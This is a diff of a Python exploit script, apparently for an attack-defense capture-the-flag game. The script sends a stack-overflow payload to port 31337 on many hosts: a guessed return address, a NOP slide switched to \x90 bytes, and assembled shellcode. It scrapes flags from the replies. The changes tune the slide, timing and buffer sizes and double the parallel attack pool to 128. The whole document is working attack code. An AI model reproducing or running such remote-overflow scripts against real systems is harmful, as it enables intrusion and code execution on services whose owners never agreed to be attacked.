@@ -44,7 +44,7 @@ a:
 """).replace(asm("inc eax"), b"\x00")
 
 def nop_slide(s):
-    pad = b"A" * 287 + skip_4_bytes + b"A" * 30000
+    pad = b"\x90" * 307 + skip_4_bytes + b"\x90" * 30000
     return pad[:21000 - len(s)] + s
 
 guc_offset = 0x56556778 - 0x56555000
@@ -92,8 +92,6 @@ def try_attack(n):
         .replace("+", al[R(0, len(al) - 1)]) \
         .replace("-", al[R(0, len(al) - 1)]), 16)
 
-    stack = 0xffff8607
-
     payload = b"A" * 16
     payload += p32(stack)
     payload += nop_slide(shellcode)
@@ -109,8 +107,8 @@ def try_attack(n):
     s.connect((ip, 31337))
     s.sendall(data)
 
-    time.sleep(2)
-    r = s.recv(25000)
+    time.sleep(5)
+    r = s.recv(30000)
     s.close()
 
     flags = re.findall(flag_re, r)
@@ -120,7 +118,7 @@ def try_attack(n):
     else:
         print(f'Attack {n}')
 
-pool = gevent.pool.Pool(64)
+pool = gevent.pool.Pool(128)
 
 cnt = 0
 
